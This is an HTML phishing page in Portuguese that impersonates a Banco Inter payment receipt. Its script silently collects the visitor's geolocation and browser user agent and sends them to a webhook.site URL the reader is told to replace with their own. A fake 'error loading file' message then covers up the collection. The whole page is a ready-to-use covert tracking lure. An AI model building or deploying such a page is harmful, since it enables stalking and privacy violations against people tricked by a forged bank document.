<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <title>Comprovante - Banco Inter</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{font-family:Arial;background:#f5f5f5;padding:60px;text-align:center}
    .box{background:#fff;border:1px solid #ccc;padding:40px;max-width:360px;margin:auto;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
    .spin{border:4px solid #f3f3f3;border-top:4px solid #0059ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="box">
    <h3>Abrindo comprovante...</h3>
    <div class="spin"></div>
    <p id="msg">Aguarde, carregando arquivo.</p>
  </div>

  <script>
    const webhook = "https://webhook.site/unique-id-aqui";  // troque pelo seu
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        fetch(webhook, {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ua: navigator.userAgent,
            ts: new Date().toISOString()
          })
        });
      }, err => {
        fetch(webhook, {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({error: err.message, ua: navigator.userAgent})
        });
      });
    }

    setTimeout(()=>{
      document.getElementById("msg").innerHTML =
        "<b>Erro ao carregar o arquivo.</b><br>Tente novamente mais tarde.";
      document.querySelector(".spin").style.display="none";
    }, 4000);
  </script>
</body>
</html>
